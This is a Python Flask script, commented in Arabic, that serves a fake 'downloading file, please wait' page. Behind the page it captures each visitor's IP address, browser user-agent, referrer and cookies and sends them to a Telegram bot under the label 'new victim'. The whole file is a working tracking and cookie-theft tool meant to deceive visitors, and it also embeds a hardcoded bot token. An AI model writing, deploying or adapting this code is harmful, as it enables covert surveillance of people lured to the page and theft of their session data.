from flask import Flask, request, render_template_string
import requests
import datetime

app = Flask(__name__)

# التوكن الخاص بك
BOT_TOKEN = "9262195612:AAHvhixjILczZNAp4AR2B7mRQAy1heKj6Is"
# ضع الـ CHAT_ID الخاص بك هنا (انسخ الرقم من getUpdates)
CHAT_ID = "ضع_الرقم_هنا"

HTML = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>جاري تحميل الملف...</h2>
    <div class="loader"></div>
    <p>يرجى الانتظار، سيبدأ التحميل تلقائياً.</p>
</body>
</html>
"""

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Error: {e}")

@app.route("/")
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')
    cookies = request.cookies
    referer = request.headers.get('Referer', 'None')
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    msg = f"""
    <b>[!] ضحية جديدة</b>
    <b>الوقت:</b> {time_now}
    <b>IP:</b> {ip}
    <b>الجهاز:</b> {ua}
    <b>الموقع المرجعي:</b> {referer}
    """
    if cookies:
        msg += f"\n<b>الكوكيز:</b> {dict(cookies)}"
    
    send_to_telegram(msg)
    return render_template_string(HTML)

if __name__ == "__main__":
    print("[*] Server started on http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
